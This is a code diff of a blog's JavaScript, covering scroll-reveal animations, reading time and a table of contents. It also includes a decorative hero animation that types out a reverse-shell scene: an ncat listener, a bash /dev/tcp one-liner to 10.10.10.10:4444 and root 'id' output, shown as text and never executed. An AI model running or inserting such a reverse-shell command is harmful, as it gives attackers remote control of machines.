@@ -1,133 +1,116 @@
-// === Razor Blog JS (restored & enhanced) ===
+// === Razor Blog JS (unified engine) ===
 
-// Reveal on scroll + stagger for cards
+// Reveal engine (single IntersectionObserver) + helpers
 (function(){
-  const revealEls = Array.from(document.querySelectorAll('.reveal'));
+  const observed = new Set();
   const io = new IntersectionObserver((entries)=>{
-    entries.forEach(e=>{ if(e.isIntersecting){ e.target.classList.add('is-in'); io.unobserve(e.target); } });
-  }, {threshold: .12});
-  revealEls.forEach(el=>io.observe(el));
+    entries.forEach(e=>{
+      if(e.isIntersecting){
+        e.target.classList.add('is-in');
+        io.unobserve(e.target);
+      }
+    });
+  }, { threshold: .12 });
 
-  // Stagger cards on index grid
-  const cards = Array.from(document.querySelectorAll('.grid .card'));
-  cards.forEach((el,i)=>{ el.classList.add('reveal'); el.style.transitionDelay = (i*25)+'ms'; });
-})();
-
-
+  function addReveal(els, stagger=0){
+    els.forEach((el, i)=>{
+      if(!el.classList.contains('reveal')) el.classList.add('reveal');
+      if(stagger) el.style.transitionDelay = (i*stagger)+'ms';
+      if(!observed.has(el)){ io.observe(el); observed.add(el); }
     });
   }
 
-  async function run(){
-    attacker.textContent = "";
-    victim.textContent = ""; // victim idle
-    for(const line of seqAttacker){
-      await typeLine(attacker, line, 22);
+  // Initial reveal targets already in DOM
+  addReveal(Array.from(document.querySelectorAll('.reveal')));
+
+  // Index grid: staggered cards
+  const gridCards = Array.from(document.querySelectorAll('.grid .card'));
+  if(gridCards.length) addReveal(gridCards, 40); // fast
+
+  // Post utilities: reading time + dynamic ToC + reveal of blocks
+  (function(){
+    const container = document.querySelector('.post .post-body');
+    if(!container) return;
+
+    // Reading time
+    const words = container.textContent.trim().split(/\s+/).length;
+    const rt = document.querySelector('[data-reading-time]');
+    if(rt){ rt.textContent = Math.max(1, Math.round(words/220)) + ' min'; }
+
+    // ToC
+    const tocRoot = document.querySelector('.toc ul');
+    if(tocRoot){
+      tocRoot.innerHTML = "";
+      const headings = container.querySelectorAll('h2, h3');
+      headings.forEach((h, idx)=>{
+        if(!h.id){ h.id = (h.textContent.trim().toLowerCase().replace(/[^\w]+/g,'-') || 'sec') + '-' + idx; }
+        const li = document.createElement('li');
+        li.className = 'level-' + h.tagName.toLowerCase();
+        const a = document.createElement('a');
+        a.href = '#' + h.id;
+        a.textContent = h.textContent;
+        li.appendChild(a);
+        tocRoot.appendChild(li);
+      });
     }
-  }
 
-  // Play once when hero terminals appear
-  const grid = document.querySelector('.term-grid');
-  let played = false;
-  const io = new IntersectionObserver((entries)=>{
-    entries.forEach(e=>{
-      if(e.isIntersecting && !played){
-        played = true; run(); io.unobserve(e.target);
-      }
-    });
-  }, {threshold: .12});
-  if(grid) io.observe(grid); else run();
-})();
+    // Reveal post blocks with small stagger (fast)
+    const blocks = Array.from(container.children);
+    addReveal(blocks, 24);
+  })();
 
-// Post utilities: reading time + dynamic ToC + reveal inside post
-(function(){
-  const container = document.querySelector('.post .post-body');
-  if(!container) return;
+  // Hero terminals typing: reverse shell then `id`
+  (function(){
+    const A = document.querySelector('[data-ty="a"]'); // attacker
+    const B = document.querySelector('[data-ty="b"]'); // victim
+    if(!A || !B) return;
 
-  // Reading time
-  const words = container.textContent.trim().split(/\s+/).length;
-  const rt = document.querySelector('[data-reading-time]');
-  if(rt){ rt.textContent = Math.max(1, Math.round(words/220)) + ' min'; }
+    const attackerSeq = [
+      "ncat -lvnp 4444",
+      "listening on [any] 4444 ...",
+      "connection received from 10.10.10.42",
+      "id",
+      "uid=0(root) gid=0(root) groups=0(root)"
+    ];
+    const victimSeq = [
+      "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"
+    ];
 
-  // Generate ToC
-  const tocRoot = document.querySelector('.toc ul');
-  if(tocRoot){
-    tocRoot.innerHTML = "";
-    const headings = container.querySelectorAll('h2, h3');
-    headings.forEach((h, idx)=>{
-      if(!h.id){ h.id = (h.textContent.trim().toLowerCase().replace(/[^\w]+/g,'-') || 'sec') + '-' + idx; }
-      const li = document.createElement('li');
-      li.className = 'level-' + h.tagName.toLowerCase();
-      const a = document.createElement('a');
-      a.href = '#' + h.id;
-      a.textContent = h.textContent;
-      li.appendChild(a);
-      tocRoot.appendChild(li);
-    });
-  }
+    function typeLine(el, str, delay){
+      return new Promise(resolve => {
+        let i = 0;
+        (function step(){
+          if(i < str.length){
+            el.textContent += str.charAt(i++);
+            setTimeout(step, delay);
+          } else {
+            el.textContent += "\n";
+            resolve();
+          }
+        })();
+      });
+    }
 
-  // Reveal children of post with small stagger
-  const io = new IntersectionObserver((entries)=>{
-    entries.forEach(e=>{ if(e.isIntersecting){ e.target.classList.add('is-in'); io.unobserve(e.target);} });
-  }, {threshold: .09});
-  Array.from(container.children).forEach((el,i)=>{
-    el.classList.add('reveal');
-    el.style.transitionDelay = (i*25)+'ms';
-    io.observe(el);
-  });
-})();
+    async function run(){
+      A.textContent = "";
+      B.textContent = "";
+      await typeLine(A, attackerSeq[0], 14);
+      await typeLine(A, attackerSeq[1], 10);
+      await typeLine(B, victimSeq[0], 12);
+      await typeLine(A, attackerSeq[2], 12);
+      await typeLine(A, attackerSeq[3], 14);
+      await typeLine(A, attackerSeq[4], 10);
+    }
 
-// Hero terminals typing: reverse shell simulation then attacker runs `id`
-(function(){
-  const A = document.querySelector('[data-ty="a"]'); // attacker
-  const B = document.querySelector('[data-ty="b"]'); // victim
-  if(!A || !B) return;
-
-  const attackerSeq = [
-    {kind:'cmd', text:'ncat -lvnp 4444'},
-    {kind:'out', text:'listening on [any] 4444 ...'},
-    {kind:'out', text:'connection received from 10.10.10.42'},
-    {kind:'cmd', text:'id'},
-    {kind:'out', text:'uid=0(root) gid=0(root) groups=0(root)'}
-  ];
-
-  const victimSeq = [
-    {kind:'cmd', text:'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'}
-  ];
-
-  function typeLine(el, str, delay){
-    return new Promise(resolve => {
-      let i = 0;
-      (function step(){
-        if(i < str.length){
-          el.textContent += str.charAt(i++);
-          setTimeout(step, delay);
-        } else {
-          el.textContent += "\\n";
-          resolve();
+    const grid = document.querySelector('.term-grid');
+    let played = false;
+    const ioHero = new IntersectionObserver((entries)=>{
+      entries.forEach(e=>{
+        if(e.isIntersecting && !played){
+          played = true; run(); ioHero.unobserve(e.target);
         }
-      })();
-    });
-  }
-
-  async function run(){
-    A.textContent = "";
-    B.textContent = "";
-    await typeLine(A, attackerSeq[0].text, 16);
-    await typeLine(A, attackerSeq[1].text, 10);
-    await typeLine(B, victimSeq[0].text, 12);
-    await typeLine(A, attackerSeq[2].text, 12);
-    await typeLine(A, attackerSeq[3].text, 16);
-    await typeLine(A, attackerSeq[4].text, 12);
-  }
-
-  const grid = document.querySelector('.term-grid');
-  let played = false;
-  const io = new IntersectionObserver((entries)=>{
-    entries.forEach(e=>{
-      if(e.isIntersecting && !played){
-        played = true; run(); io.unobserve(e.target);
-      }
-    });
-  }, {threshold: .10});
-  if(grid) io.observe(grid); else run();
+      });
+    }, {threshold: .10});
+    if(grid) ioHero.observe(grid); else run();
+  })();
 })();
